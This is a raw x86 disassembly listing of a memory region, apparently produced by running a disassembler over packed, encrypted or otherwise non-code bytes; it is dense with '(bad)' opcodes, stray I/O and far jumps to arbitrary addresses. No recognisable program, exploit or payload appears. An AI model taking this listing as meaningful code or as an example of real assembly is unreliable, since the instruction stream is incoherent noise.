  42341a:	ror    DWORD PTR [edi],cl
  42341c:	adc    DWORD PTR [esi+0x60],edx
  42341f:	and    DWORD PTR [ebx+0x7085ce36],eax
  423425:	or     al,0x88
  423427:	add    bh,BYTE PTR ds:0x6dfad0d7
  42342d:	fldenv [eax+0x5d679782]
  423433:	fild   WORD PTR [ebp+0x0]
	...
  423496:	shl    BYTE PTR [eax-0x8a90bb],0xea
  42349d:	mov    edi,0xe016fb60
  4234a2:	mov    eax,ds:0x6996db66
  4234a7:	ja     0x4234aa
  4234a9:	add    BYTE PTR [edi],al
  4234ab:	add    DWORD PTR [eax],eax
  4234ad:	add    BYTE PTR [ebx+0x58],ch
  4234b0:	addr16 mov bp,bp
  4234b4:	gs inc eax
  4234b6:	popf   
  4234b7:	sti    
  4234b8:	loope  0x42352e
  4234ba:	xor    ecx,DWORD PTR [esi]
  4234bc:	out    dx,eax
  4234bd:	aam    0x47
  4234bf:	cmp    DWORD PTR [eax+0x6e8015f6],edx
  4234c5:	xchg   bh,ah
  4234c7:	pop    ebp
  4234c8:	pop    ss
  4234c9:	jmp    0x1ff4cea
  4234ce:	outs   dx,DWORD PTR ds:[esi]
  4234cf:	std    
  4234d0:	dec    edi
  4234d1:	cmp    DWORD PTR [ebx],edi
  4234d3:	adc    DWORD PTR [eax],edx
  4234d5:	push   ebx
  4234d6:	push   esp
  4234d7:	in     eax,0x7b
  4234d9:	jge    0x4234e5
  4234db:	pop    ss
  4234dc:	aas    
  4234dd:	mov    dh,0xa8
  4234df:	(bad)  
  4234e0:	outs   dx,BYTE PTR ds:[esi]
  4234e1:	int    0xdf
  4234e3:	mov    fs,WORD PTR [ecx+0x22]
  4234e6:	dec    esp
  4234e7:	psubusb mm3,QWORD PTR [edi+0x19e386a8]
  4234ee:	jns    0x423499
  4234f0:	sbb    dl,BYTE PTR [edx]
  4234f2:	or     DWORD PTR [edi-0x3c],eax
  4234f5:	test   ah,bl
  4234f7:	xchg   DWORD PTR [edi+0x2541cee2],esi
  4234fd:	inc    esi
  4234fe:	pop    ebx
  4234ff:	out    0xf3,eax
  423501:	sbb    ebx,DWORD PTR [esi-0x66]
  423504:	pop    ss
  423505:	or     BYTE PTR cs:[edi+0x3e43c3c1],al
  42350c:	push   ss
  42350d:	jb     0x423588
  42350f:	fdivr  st(5),st
  423511:	(bad)
  423514:	mov    bl,BYTE PTR [esi+ecx*2+0x6]
  423518:	jo     0x4234f7
  42351a:	xchg   edi,eax
  42351b:	add    eax,0xee9df223
  423520:	es jmp 0xdd8189a7
  423526:	pop    ebx
  423527:	fwait
  423528:	inc    esp
  423529:	mov    edx,0x85f338a0
  42352e:	(bad)  
  42352f:	mov    ch,0x33
  423531:	pushf  
  423532:	daa    
  423533:	test   BYTE PTR [eax+0x7b],dl
  423536:	push   edi
  423537:	inc    ecx
  423538:	or     eax,0x270693fe
  42353d:	jbe    0x4234db
  42353f:	dec    ebp
  423540:	xor    BYTE PTR [edx+0x6c],0xbc
  423544:	sbb    cl,BYTE PTR [edi-0xf]
  423547:	test   al,0xe7
  423549:	daa    
  42354a:	add    BYTE PTR [ebx],0x13
  42354d:	xchg   edi,eax
  42354e:	mov    dl,BYTE PTR [esi-0x5a]
  423551:	mov    dh,0x2
  423553:	push   0xffffffa6
  423555:	adc    eax,0x7405fe97
  42355a:	mov    cl,BYTE PTR [eax+0x33]
  42355d:	add    dl,bh
  42355f:	cmp    eax,0x1823a9e8
  423564:	jp     0x423551
  423566:	jne    0x423526
  423568:	add    al,0xc3
  42356a:	push   0xffffffc9
  42356c:	mov    eax,0xd422aec0
  423571:	cmp    BYTE PTR [ebx-0x46],bl
  423574:	adc    eax,0xbda31e55
  423579:	mov    eax,ds:0x9c7dae45
  42357e:	not    ebx
  423580:	mov    bh,0x51
  423582:	pushf  
  423583:	pop    ss
  423584:	lods   eax,DWORD PTR ds:[esi]
  423585:	mov    al,ds:0x829cce05
  42358a:	(bad)  [eax-0x5d]
  42358d:	rol    DWORD PTR [edx],1
  42358f:	pop    esi
  423590:	jb     0x423525
  423592:	out    dx,al
  423593:	retf   
  423594:	sti    
  423595:	inc    edi
  423596:	push   esi
  423597:	and    al,0xba
  423599:	ret    0x51d
  42359c:	mov    ebx,0xeffca9cd
  4235a1:	pop    esp
  4235a2:	sbb    eax,0x98c4d9d1
  4235a7:	mov    eax,ds:0x27b682ff
  4235ac:	dec    ebp
  4235ad:	pop    esi
  4235ae:	and    al,0xc5
  4235b0:	add    ecx,eax
  4235b2:	bound  ebp,QWORD PTR [eax-0x10]
	...
  423615:	add    BYTE PTR [eax+0x7f747c8f],al
  42361b:	test   DWORD PTR [eax+0x6a2d48ff],0xa9862fda
  423625:	dec    esi
  423626:	jo     0x4236a0
  423628:	add    DWORD PTR [eax],eax
  42362a:	pop    es
  42362b:	add    DWORD PTR [eax],eax
  42362d:	add    BYTE PTR [edi],dl
  42362f:	hlt    
  423630:	clc    
  423631:	div    DWORD PTR [ebx-0x25c9bdc4]
  423637:	adc    al,0xb3
  423639:	sub    edi,DWORD PTR [ecx+ecx*4]
  42363c:	leave  
  42363d:	call   0xc6170578
  423642:	and    DWORD PTR [ebp-0x4ddf3d0b],esp
  423648:	sub    esi,DWORD PTR ds:0xf3e812c3
  42364e:	cwde   
  42364f:	inc    edi
  423650:	test   al,0x73
  423652:	pop    edi
  423653:	sub    DWORD PTR [ecx+0x6f],esi
  423656:	adc    al,0x41
  423658:	ret    
  423659:	repz aam 0x94
  42365c:	clc    
  42365d:	ss inc esi
  42365f:	cmp    al,0x66
  423661:	push   es
  423662:	aaa    
  423663:	cdq    
  423664:	outs   dx,DWORD PTR ds:[esi]
  423665:	enter  0x58d1,0x11
  423669:	jp     0x4236e7
  42366b:	mov    edi,0x4128d9ce
  423670:	jge    0x4236a1
  423672:	or     ah,dh
  423674:	push   ebx
  423675:	fist   WORD PTR [esi-0x62]
  423678:	pop    es
  423679:	popa   
  42367a:	test   al,0xff
  42367c:	xchg   esp,eax
  42367d:	sbb    cl,BYTE PTR [esi+0x55]
  423680:	xchg   esi,eax
  423682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423683:	dec    ecx
  423684:	cmp    ebx,DWORD PTR [edi+0x35]
  423687:	mov    ebx,0xc40928e3
  42368c:	sub    BYTE PTR fs:0xfd1f056f,ah
  423693:	sub    BYTE PTR [ecx+0x24],bl
  423696:	ss pop ss
  423698:	in     eax,0x86
  42369a:	pop    eax
  42369b:	iret   
  42369c:	rcr    esp,1
  42369e:	das    
  42369f:	cdq    
  4236a0:	jb     0x42371b
  4236a2:	out    0xf8,eax
  4236a4:	cmp    al,0xfb
  4236a6:	iret   
  4236a7:	xor    BYTE PTR [ecx-0x3a],al
  4236aa:	aam    0x70
  4236ac:	std    
  4236ad:	gs push 0xc
  4236b0:	jae    0x42368a
  4236b2:	mov    ss,WORD PTR [edi+0x60]
  4236b5:	jecxz  0x4236de
  4236b7:	cmp    dh,ah
  4236b9:	jne    0x42369a
  4236bb:	movzx  edi,dx
  4236be:	cmc    
  4236bf:	sub    ebx,DWORD PTR [edi+eax*8+0x79]
  4236c3:	dec    esp
  4236c4:	cmp    BYTE PTR [ebx-0x53],ah
  4236c7:	cdq    
  4236c8:	scas   al,BYTE PTR es:[edi]
  4236c9:	test   eax,0x2a19f993
  4236ce:	sub    DWORD PTR [edx-0x3d142448],eax
  4236d4:	js     0x423739
  4236d6:	pop    es
  4236d7:	(bad)  
  4236d9:	jmp    0x2ab0:0xb29fa2f3
  4236e0:	and    BYTE PTR [esi+0x28],al
  4236e3:	add    BYTE PTR [esi+0x69c5d5c2],cl
  4236e9:	in     al,dx
  4236ea:	add    bh,BYTE PTR [ebp+0x6e38bf64]
  4236f0:	xchg   ecx,eax
  4236f1:	icebp  
  4236f2:	in     al,0x99
  4236f4:	jno    0x4236f9
  4236f6:	inc    ebx
  4236f7:	shl    DWORD PTR [esi+0x31],cl
  4236fa:	and    ch,BYTE PTR [edx-0x49]
  4236fd:	sub    DWORD PTR [edx-0x5],eax
  423700:	retf   0x94cd
  423703:	(bad)  
  423704:	out    dx,eax
  423705:	and    edi,DWORD PTR [ebp+0x6c]
  423708:	sub    ebx,DWORD PTR [esi]
  42370a:	adc    DWORD PTR [ebp+0x6],eax
  42370d:	push   esp
  42370e:	in     eax,0xaa
  423710:	sahf   
  423711:	test   al,0xcc
  423713:	es pop es
  423715:	xor    BYTE PTR [eax-0x75],bl
  423718:	ret    0x2666
  42371b:	push   edx
  42371c:	cmp    BYTE PTR [ebp+0x4a],0x80
  423720:	mov    ch,0xbd
  423722:	int    0xab
  423724:	jb     0x42378b
  423726:	test   esi,edx
  423728:	loopne 0x4236df
  42372a:	ret    0xa419
  42372d:	xchg   bh,dh
  42372f:	popa   
  423730:	scas   al,BYTE PTR es:[edi]
  423731:	out    dx,eax
  423732:	jbe    0x423735
  423734:	mov    BYTE PTR [eax],al
	...
  423796:	xor    al,0x23
  423798:	jo     0x423737
  42379a:	ja     0x42377b
  42379c:	std    
  42379d:	stos   DWORD PTR es:[edi],eax
  42379e:	inc    edx
  42379f:	push   ebx
  4237a0:	cli    
  4237a1:	test   eax,0xf60eefd9
  4237a6:	ja     0x423821
  4237a8:	add    DWORD PTR [eax],eax
  4237aa:	pop    es
  4237ab:	add    DWORD PTR [eax],eax
  4237ad:	add    BYTE PTR [esi+0x7e],bh
  4237b0:	push   0x5c
  4237b2:	jns    0x42382d
  4237b4:	lar    ebx,dx
  4237b7:	std    
  4237b8:	mov    eax,ds:0x79ae4d9a
  4237bd:	sub    al,0x34
  4237bf:	inc    esi
  4237c0:	adc    edi,DWORD PTR [eax]
  4237c2:	or     dh,BYTE PTR [ecx]
  4237c4:	xchg   esp,eax
  4237c5:	and    dl,dh
  4237c7:	(bad)  
  4237c8:	retf   0x6fc6
  4237cb:	dec    eax
  4237cc:	fiadd  DWORD PTR [eax-0x7]
  4237cf:	scas   al,BYTE PTR es:[edi]
  4237d0:	xchg   ebx,eax
  4237d1:	dec    ebx
  4237d2:	mov    bh,0x71
  4237d4:	enter  0x253b,0x3f
  4237d8:	xchg   BYTE PTR [ecx-0x7c998381],ah
  4237de:	stc    
  4237df:	mov    ebx,0x742b30ad
  4237e4:	(bad)  
  4237e5:	ds xor ah,ah
  4237e8:	sahf   
  4237e9:	scas   eax,DWORD PTR es:[edi]
  4237ea:	popf   
  4237eb:	scas   al,BYTE PTR es:[edi]
  4237ec:	mov    ebx,0x80c5c4d
  4237f1:	jae    0x423805
  4237f3:	cld    
  4237f4:	in     eax,0x79
  4237f6:	xchg   edi,eax
  4237f7:	inc    ebx
  4237f8:	push   eax
  4237f9:	sub    al,BYTE PTR [edx-0x2c]
  4237fc:	jle    0x423840
  4237fe:	lahf   
  4237ff:	dec    ecx
  423800:	sub    eax,DWORD PTR [edi-0x613fb476]
  423806:	shl    DWORD PTR [ebx],cl
  423808:	mov    al,ds:0x20a43782
  42380d:	fmul   DWORD PTR [edi+0x6552630b]
  423813:	or     al,0x62
  423815:	lahf   
  423816:	clc    
  423817:	ds mov dl,0x7d
  42381a:	sub    al,0x6b
  42381c:	add    al,0xfc
  42381e:	mov    eax,0x1cc0dc0d
  423823:	add    esp,edi
  423825:	cmp    edi,DWORD PTR [esi+esi*4+0x68]
  423829:	loope  0x423829
  42382b:	stos   BYTE PTR es:[edi],al
  42382c:	jmp    0x7e44:0x3ef65a8e
  423833:	jno    0x4238a4
  423835:	imul   esi,DWORD PTR [ecx+eiz*1-0x6],0xb848b027
  42383d:	cs pop esi
  42383f:	push   ecx
  423840:	es push edx
  423842:	xchg   esi,eax
  423843:	pop    edx
  423844:	mov    bh,0x2
  423846:	jmp    0x42388c
  423848:	stc    
  423849:	sub    BYTE PTR [edx+0x15050fbf],dl
  42384f:	push   ebp
  423850:	(bad)  
  423851:	retf   
  423852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423853:	repz in eax,dx
  423855:	and    eax,0xc5fb13e8
  42385a:	sbb    bh,bh
  42385c:	sti    
  42385d:	push   es
  42385e:	imul   ebx,DWORD PTR [edi],0x42
  423861:	sahf   
  423862:	clc    
  423863:	sahf   
  423864:	jl     0x42380b
  423866:	inc    ebp
  423867:	ret    
  423868:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423869:	ror    DWORD PTR [esi-0x52],1
  42386c:	or     BYTE PTR [ebx+0x3c123699],0xb1
  423873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423874:	jmp    0x6a860127
  423879:	push   edi
  42387a:	test   al,0x70
  42387c:	arpl   cx,di
  42387e:	pushf  
  42387f:	fld    TBYTE PTR [edx]
  423881:	mov    ebx,0x4d3a3c53
  423886:	jnp    0x423839
  423888:	push   0x5cf0d838
  42388d:	es cs inc esp
  423890:	jbe    0x4238b2
  423892:	pop    esi
  423894:	les    esi,FWORD PTR [edi-0x40]
  423897:	mov    ch,0x29
  423899:	and    eax,0xfe09ead8
  42389e:	push   esi
  42389f:	add    edi,DWORD PTR [esi]
  4238a1:	push   edx
  4238a2:	aad    0x10
  4238a4:	add    al,0x71
  4238a6:	in     al,0x22
  4238a8:	sahf   
  4238a9:	out    0x15,al
  4238ab:	sub    DWORD PTR [ecx-0x3e1ba4dc],0x72
  4238b2:	repnz scas al,BYTE PTR es:[edi]
  4238b4:	jmp    0x4238b9
	...
  423915:	add    BYTE PTR [edx-0x770e5c],cl
  42391b:	(bad)  
  42391d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42391e:	lods   eax,DWORD PTR ds:[esi]
  42391f:	rcr    BYTE PTR [edx],1
  423921:	cmp    DWORD PTR [ecx-0x38],eax
  423924:	dec    esi
  423925:	lock jle 0x4239a2
  423928:	add    DWORD PTR [eax],eax
  42392a:	pop    es
  42392b:	add    DWORD PTR [eax],eax
  42392d:	add    ah,bh
  42392f:	imul   esp,edi,0x1de53aca
  423935:	sbb    al,0x17
  423937:	or     BYTE PTR [eax-0x4dd29945],bl
  42393d:	mov    edx,0xee16779c
  423942:	call   0xa482edca
  423947:	cs dec eax
  423949:	popa   
  42394a:	in     al,0xf8
  42394c:	xlat   BYTE PTR ds:[ebx]
  42394d:	sbb    esp,DWORD PTR [ebx]
  42394f:	ficomp DWORD PTR [ecx+ebp*1+0xca9db57]
  423956:	xchg   esi,eax
  423957:	fidivr WORD PTR [edi]
  423959:	inc    esi
  42395a:	lds    esp,FWORD PTR [eax]
  42395c:	pop    edx
  42395d:	push   ds
  42395e:	in     al,dx
  42395f:	or     dl,dh
  423961:	add    eax,0xc2511656
  423966:	(bad)  
  423967:	mov    ch,0xd2
  423969:	int3   
  42396a:	pushf  
  42396b:	aam    0x73
  42396d:	rcr    DWORD PTR [edi-0xc],1
  423970:	cwde   
  423971:	inc    ecx
  423972:	fisttp DWORD PTR [ecx-0x1e85a517]
  423978:	into   
  423979:	inc    eax
  42397a:	addr16 cmc 
  42397c:	je     0x4239b7
  42397e:	jg     0x4239be
  423980:	sbb    bh,ah
  423982:	push   esi
  423983:	jge    0x42393d
  423985:	ror    DWORD PTR [ebx-0x49cdedd],1
  42398b:	outs   dx,DWORD PTR ds:[esi]
  42398c:	js     0x423952
  42398e:	adc    al,0xd5
  423990:	cmp    ecx,ebx
  423992:	mov    eax,ds:0x31cec0e5
  423997:	shl    DWORD PTR [edi+edi*4+0x5b],1
  42399b:	dec    edi
  42399c:	ret    
  42399d:	es cmp eax,0xe0c90e2c
  4239a3:	xor    al,0x47
  4239a5:	cmp    BYTE PTR cs:[ebx],bl
  4239a8:	pop    edx
  4239a9:	gs push ecx
  4239ab:	jnp    0x4239ce
  4239ad:	adc    edx,esp
  4239af:	mov    eax,ds:0x1baefcfa
  4239b4:	mov    eax,ds:0x36f4349
  4239b9:	pop    ebp
  4239ba:	dec    ecx
  4239bb:	clc    
  4239bc:	call   FWORD PTR [ebp-0x3ebf99fc]
  4239c2:	sbb    bl,BYTE PTR [edx+0x21af4efb]
  4239c8:	push   esp
  4239c9:	cmp    DWORD PTR [esp+edx*8+0x2736b553],esi
  4239d0:	and    al,0x13
  4239d2:	mov    ?,WORD PTR ds:0xd5f93a3e
  4239d8:	xor    DWORD PTR [ecx],ebx
  4239da:	or     eax,0x629af3c2
  4239df:	inc    edx
  4239e0:	dec    edx
  4239e1:	jmp    0x209d:0x9edc80cf
  4239e8:	push   es
  4239e9:	cmp    al,0x18
  4239eb:	xchg   DWORD PTR [ecx-0x3b],edx
  4239ee:	or     al,0xdf
  4239f0:	xchg   ebx,eax
  4239f1:	in     eax,dx
  4239f2:	shl    DWORD PTR [ebx+ecx*4-0x7e379671],0x79
  4239fa:	call   0x257a:0x8cfeaa64
  423a01:	sti    
  423a02:	sbb    BYTE PTR [esi+0x4338787],bl
  423a08:	inc    DWORD PTR [esi+0x66]
  423a0b:	cmc    
  423a0c:	shr    esi,1
  423a0e:	or     dh,al
  423a10:	stc    
  423a11:	cld    
  423a12:	retf   
  423a13:	pop    ebx
  423a14:	shl    DWORD PTR [edi+0x56],0x4f
  423a18:	imul   edi,DWORD PTR ss:[eax-0x42],0xf4fb3bb7
  423a20:	ret    
  423a21:	(bad)  [edx-0x31]
  423a24:	sub    DWORD PTR [ecx],0xc846ee32
  423a2a:	retf   
  423a2b:	push   eax
  423a2c:	outs   dx,DWORD PTR ds:[esi]
  423a2d:	pop    ds
  423a2e:	sub    ch,BYTE PTR [ebx+eax*1+0x27e043d8]
	...
  423a95:	add    BYTE PTR [eax],dh
  423a97:	cmp    eax,0xdf7d9f75
  423a9c:	cli    
  423a9d:	mov    edi,0x13a51b28
  423aa2:	arpl   WORD PTR [esi],ax
  423aa4:	and    DWORD PTR [eax-0x7b],esp
  423aa7:	jnp    0x423aaa
  423aa9:	add    BYTE PTR [edi],al
  423aab:	add    DWORD PTR [eax],eax
  423aad:	add    BYTE PTR [ebp-0x73],bl
  423ab0:	sub    al,0x78
  423ab2:	inc    esp
  423ab3:	(bad)  
  423ab4:	jne    0x423a8b
  423ab6:	mov    edx,0xb23f3662
  423abb:	ror    BYTE PTR [edi-0x4a],1
  423abe:	int3   
  423abf:	aas    
  423ac0:	adc    DWORD PTR [edi+eax*2+0x55c4a5b6],esi
  423ac7:	out    dx,eax
  423ac8:	sub    DWORD PTR [edi-0x69],0x4
  423acc:	int    0x89
  423ace:	aad    0xe7
  423ad0:	push   edx
  423ad1:	xchg   edx,eax
  423ad2:	xor    BYTE PTR [edi-0x43],bh
  423ad5:	ror    BYTE PTR [esi],cl
  423ad7:	mov    edx,DWORD PTR [edi+0x34247697]
  423add:	leave  
  423ade:	in     al,dx
  423adf:	mov    esp,0xd4bee1f7
  423ae4:	adc    al,0x75
  423ae6:	add    BYTE PTR [edi+0x2c65b13f],al
  423aec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423aed:	(bad)  
  423aee:	rcr    BYTE PTR [edx+0x18],0x69
  423af2:	(bad)  
  423af3:	sbb    ecx,ebp
  423af5:	scas   al,BYTE PTR es:[edi]
  423af6:	sti    
  423af7:	jecxz  0x423b66
  423af9:	in     eax,dx
  423afa:	fwait
  423afb:	xchg   ebp,eax
  423afc:	sbb    al,0x6c
  423afe:	and    esp,eax
  423b00:	retf   
  423b01:	mov    ebx,0xeab2212d
  423b06:	sub    ebp,edx
  423b08:	cs jle 0x423a90
  423b0b:	dec    ebp
  423b0c:	fs jecxz 0x423ab0
  423b0f:	sbb    eax,0x296eedcd
  423b14:	xchg   esi,eax
  423b15:	daa    
  423b16:	int3   
  423b17:	(bad)  
  423b18:	adc    ah,BYTE PTR [esi+ecx*2-0x7f]
  423b1c:	mov    eax,ds:0xeda13fb6
  423b21:	mov    esp,0xc6b290b6
  423b26:	mov    al,0xd9
  423b28:	cdq    
  423b29:	dec    esi
  423b2a:	int    0x79
  423b2c:	cli    
  423b2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b2e:	xlat   BYTE PTR ds:[ebx]
  423b2f:	mov    dl,0x30
  423b31:	jmp    0x76465e70
  423b36:	inc    esi
  423b37:	addr16 icebp 
  423b39:	inc    eax
  423b3a:	inc    esp
  423b3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b3c:	pushf  
  423b3d:	mov    ds:0x66274b65,eax
  423b42:	(bad)  
  423b43:	fisubr DWORD PTR [edi]
  423b45:	mov    eax,fs
  423b47:	mov    ch,0xae
  423b49:	jbe    0x423b94
  423b4b:	mov    eax,0x9cb2f394
  423b50:	xlat   BYTE PTR ds:[ebx]
  423b51:	mov    ebp,0xab0c1adf
  423b56:	push   edx
  423b57:	mov    eax,0xfc80c9e
  423b5c:	mov    al,0x22
  423b5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b5f:	sar    BYTE PTR [ecx+ebx*2-0x2f],cl
  423b63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b64:	push   edx
  423b65:	pop    ebx
  423b66:	xchg   edi,eax
  423b67:	inc    ebp
  423b68:	xor    ah,BYTE PTR [edx+0x77]
  423b6b:	inc    edx
  423b6c:	mov    esp,0xe3985427
  423b71:	mov    ebx,0x4afb1ed9
  423b76:	jb     0x423b40
  423b78:	jnp    0x423b84
  423b7a:	mov    cl,0x5d
  423b7c:	jno    0x423bab
  423b7e:	mov    bl,0x12
  423b80:	bound  edi,QWORD PTR [edx-0x40]
  423b83:	int    0xc5
  423b85:	lock cwde 
  423b87:	pop    ebx
  423b88:	imul   edx,DWORD PTR [eax-0x1f970ff6],0xa68c415f
  423b92:	in     eax,0x8c
  423b94:	ja     0x423c07
  423b96:	mov    eax,ds:0xc540ae88
  423b9b:	out    0xdc,eax
  423b9d:	out    dx,eax
  423b9e:	cmp    edx,DWORD PTR [ebx-0x54cc85ec]
  423ba4:	adc    DWORD PTR [ebx+0x27ba9cdd],edi
  423baa:	pop    edi
  423bab:	mov    bh,0xac
  423bad:	or     al,0x32
  423baf:	add    al,0x96
  423bb1:	imul   edi,esp,0xffffffd6
  423bb4:	or     DWORD PTR [eax],eax
	...
  423c16:	std    
  423c17:	(bad)  
  423c18:	test   eax,0xff57ab46
  423c1d:	inc    edi
  423c1f:	jbe    0x423c78
  423c21:	stc    
  423c22:	dec    eax
  423c23:	add    DWORD PTR [edi],0x17c8c77
  423c29:	add    BYTE PTR [edi],al
  423c2b:	add    DWORD PTR [eax],eax
  423c2d:	add    BYTE PTR [ebp+edi*1+0x1b209ad8],dl
  423c34:	loope  0x423bdb
  423c36:	add    al,0xc3
  423c38:	stc    
  423c39:	ins    BYTE PTR es:[edi],dx
  423c3a:	out    0xde,al
  423c3c:	xchg   ebx,eax
  423c3d:	add    ecx,DWORD PTR ds:0xd5a01
  423c43:	daa    
  423c44:	inc    esp
  423c45:	xchg   esp,eax
  423c46:	add    eax,0x11088e01
  423c4b:	jne    0x423c6a
  423c4d:	cmp    bh,BYTE PTR [edx-0xe28b16f]
  423c53:	jns    0x423c9d
  423c55:	xchg   esi,ebx
  423c57:	test   BYTE PTR [edx-0x3677ff9a],ch
  423c5d:	(bad)  
  423c5e:	es mov ebx,0xb8309562
  423c64:	fidivr WORD PTR [edi+0x1606ef02]
  423c6a:	cmp    bl,ah
  423c6c:	dec    edx
  423c6d:	stc    
  423c6e:	dec    esp
  423c6f:	sbb    eax,esi
  423c71:	lods   eax,DWORD PTR ds:[esi]
  423c72:	mov    esp,edi
  423c74:	adc    BYTE PTR [ebp+0x539572b4],bh
  423c7a:	fistp  QWORD PTR [ecx+0x4c]
  423c7d:	push   esp
  423c7e:	xchg   esp,eax
  423c7f:	div    BYTE PTR [edi]
  423c81:	mov    edi,0x6570bffb
  423c86:	imul   esp,DWORD PTR [ebp+ebp*2+0x1],0x59490806
  423c8e:	xchg   edx,eax
  423c8f:	std    
  423c90:	mov    ah,0xd7
  423c92:	mov    bl,BYTE PTR [eax+0x5af08af3]
  423c98:	sahf   
  423c99:	dec    eax
  423c9a:	fld    QWORD PTR [esi-0x3e7df4b4]
  423ca0:	es push edx
  423ca2:	xchg   ebx,eax
  423ca3:	lods   al,BYTE PTR ds:[esi]
  423ca4:	mov    ecx,0xeafe0100
  423ca9:	jp     0x423d13
  423cab:	repz aaa 
  423cad:	pop    eax
  423cae:	jge    0x423cda
  423cb0:	mov    ah,0x64
  423cb2:	xor    dh,bl
  423cb4:	imul   edi,DWORD PTR [esi-0x6dc30636],0xffffffd3
  423cbb:	rol    BYTE PTR [eax],1
  423cbd:	push   edx
  423cbe:	inc    ebx
  423cbf:	jae    0x423cd7
  423cc1:	pop    ecx
  423cc2:	mov    bh,cl
  423cc4:	push   edx
  423cc5:	add    eax,DWORD PTR [edi-0x2f]
  423cc8:	push   esp
  423cc9:	stc    
  423cca:	adc    cl,BYTE PTR [esi+eiz*1]
  423ccd:	(bad)  
  423cce:	aas    
  423ccf:	lds    ecx,FWORD PTR [edx-0x37]
  423cd2:	mov    esi,0xc4c2cd2e
  423cd7:	sub    BYTE PTR [ebx],0x5f
  423cda:	inc    ebp
  423cdb:	jb     0x423c70
  423cdd:	jbe    0x423c96
  423cdf:	clc    
  423ce0:	inc    ecx
  423ce1:	popa   
  423ce2:	add    al,0x60
  423ce4:	xchg   DWORD PTR [esi+0x39],esp
  423ce7:	leavew 
  423ce9:	retf   0x90f7
  423cec:	cld    
  423ced:	stos   DWORD PTR es:[edi],eax
  423cee:	lods   al,BYTE PTR ds:[esi]
  423cef:	cmc    
  423cf0:	inc    esp
  423cf1:	in     eax,0xdd
  423cf3:	dec    eax
  423cf4:	add    ch,bh
  423cf6:	sahf   
  423cf7:	jns    0x423ca5
  423cf9:	out    0xd0,eax
  423cfb:	push   edx
  423cfc:	in     al,dx
  423cfd:	xchg   ecx,eax
  423cfe:	(bad)  
  423cff:	lods   al,BYTE PTR ds:[esi]
  423d00:	pop    esp
  423d01:	stc    
  423d02:	nop
  423d03:	pop    edi
  423d04:	inc    edi
  423d05:	and    eax,edx
  423d07:	int    0xbc
  423d09:	inc    ebx
  423d0a:	sbb    eax,0xda49a6ae
  423d0f:	mov    dh,0x59
  423d11:	cmp    edi,edi
  423d13:	out    0x13,al
  423d15:	shr    DWORD PTR [ecx],cl
  423d17:	js     0x423cc9
  423d19:	stc    
  423d1a:	cmp    eax,0x70284d3c
  423d1f:	fbstp  TBYTE PTR [edx-0x786cf132]
  423d25:	add    ch,BYTE PTR [ecx-0x7c]
  423d28:	test   DWORD PTR [ecx+0x45],ebx
  423d2b:	pop    ebp
  423d2c:	cmp    eax,0xd01d666e
  423d31:	ret    0x7c75
  423d34:	test   BYTE PTR [eax],0x0
	...
  423d93:	add    BYTE PTR [eax],al
  423d95:	add    BYTE PTR [edx-0xa],ah
  423d98:	xchg   DWORD PTR [ecx],ecx
  423d9a:	xchg   edi,eax
  423d9b:	jns    0x423d8b
  423d9d:	dec    edi
  423d9f:	out    0x92,al
  423da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423da2:	push   esi
  423da3:	xchg   ebp,eax
  423da4:	xor    DWORD PTR [edx+0x17d93],0x7
  423dab:	add    DWORD PTR [eax],eax
  423dad:	add    BYTE PTR [edi],ch
  423daf:	or     al,0x64
  423db1:	xchg   esp,eax
  423db2:	cli    
  423db3:	push   0xf07925fa
  423db8:	dec    esp
  423db9:	cmc    
  423dba:	loop   0x423def
  423dbc:	sbb    DWORD PTR [ebx],ebp
  423dbe:	ret    0xade4
  423dc1:	inc    esi
  423dc2:	scas   al,BYTE PTR es:[edi]
  423dc3:	push   esi
  423dc4:	mov    ds:0x63a198b9,eax
  423dc9:	adc    bl,bl
  423dcb:	dec    esi
  423dcc:	mov    BYTE PTR [ebx+0x58],0x87
  423dd0:	test   BYTE PTR [esi+0x162856e6],ch
  423dd6:	or     DWORD PTR [edx],0x4f1b50ca
  423ddc:	lea    ebx,[ecx]
  423dde:	outs   dx,DWORD PTR ds:[esi]
  423ddf:	jge    0x423e37
  423de1:	dec    ebp
  423de2:	pushf  
  423de3:	or     eax,0x97a67f3d
  423de8:	mov    edx,0xf567879d
  423ded:	or     BYTE PTR [edx+0x49ddb89],bl
  423df3:	daa    
  423df4:	out    0x4a,al
  423df6:	jg     0x423db2
  423df8:	fiadd  WORD PTR [eax]
  423dfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423dfb:	ficom  DWORD PTR [eax-0x4d]
  423dfe:	fst    DWORD PTR [edi]
  423e00:	imul   edi,DWORD PTR [esi-0x69e7fd66],0xffffff88
  423e07:	call   DWORD PTR [edx-0x4ca4d6a3]
  423e0d:	mov    bh,0x7
  423e0f:	nop
  423e10:	xor    eax,0x4f743c28
  423e15:	push   cs
  423e16:	lock (bad) 
  423e19:	scas   eax,DWORD PTR es:[edi]
  423e1a:	cmc    
  423e1b:	mov    al,ds:0x856ecf5d
  423e20:	(bad)  
  423e21:	cmp    ch,BYTE PTR [ebp-0x2be3c7c8]
  423e27:	inc    ebx
  423e28:	fst    QWORD PTR [esi+edi*1]
  423e2b:	fldl2t 
  423e2d:	pop    ebp
  423e2e:	ror    BYTE PTR [ecx-0x16],0x29
  423e32:	push   esp
  423e33:	jnp    0x423dbf
  423e35:	and    dh,BYTE PTR [eax]
  423e37:	ror    DWORD PTR [edi+0x10],1
  423e3a:	(bad)  
  423e3b:	les    edx,FWORD PTR [ebp-0x41]
  423e3e:	sbb    al,0xda
  423e40:	cmc    
  423e41:	shr    BYTE PTR [eax],1
  423e43:	mov    ss,edi
  423e45:	int3   
  423e46:	xchg   esp,eax
  423e47:	jg     0x423e31
  423e49:	xchg   edx,eax
  423e4a:	int    0x3e
  423e4c:	fwait
  423e4d:	call   0x79935bc4
  423e52:	pop    ss
  423e53:	xor    dl,bh
